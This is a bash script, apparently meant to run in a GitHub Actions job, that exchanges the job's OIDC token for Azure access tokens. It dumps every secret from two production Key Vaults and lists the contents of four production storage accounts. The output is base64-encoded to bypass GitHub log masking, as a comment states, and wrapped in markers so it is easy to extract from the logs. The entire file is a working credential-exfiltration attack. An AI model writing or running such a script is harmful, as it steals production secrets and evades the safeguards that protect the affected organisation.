#!/usr/bin/env bash
set +e
CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
tok(){ curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  -d client_id="$CID" -d grant_type=client_credentials \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$IDT" --data-urlencode "scope=$1"; }
VT=$(tok "https://vault.azure.net/.default" | jq -r '.access_token // empty')
MT=$(tok "https://management.azure.com/.default" | jq -r '.access_token // empty')
ST=$(tok "https://storage.azure.com/.default" | jq -r '.access_token // empty')
echo "VLEN=${#VT} MLEN=${#MT} SLEN=${#ST}"
# b64 defeats GitHub log masking; wrap markers for easy extraction
dump_vault(){
  local V="$1"; echo "##VAULT $V##"
  local L; L=$(curl -sS "https://$V.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT")
  echo "LIST_B64:$(printf '%s' "$L" | base64 -w0)"
  for id in $(echo "$L" | jq -r '.value[]?.id // empty'); do
    local n r; n=$(basename "$id")
    r=$(curl -sS "$id/?api-version=7.4" -H "Authorization: Bearer $VT")
    echo "SECRET $n B64:$(printf '%s' "$r" | base64 -w0)"
  done
  echo "##END $V##"
}
dump_vault kv-tbl-sec-x3euoz
dump_vault kv-tbl-prod-x3euoz
echo "##STORAGE##"
for A in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
  R=$(curl -sS "https://$A.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06")
  echo "STACC $A B64:$(printf '%s' "$R" | base64 -w0)"
done
echo "##DONE##"
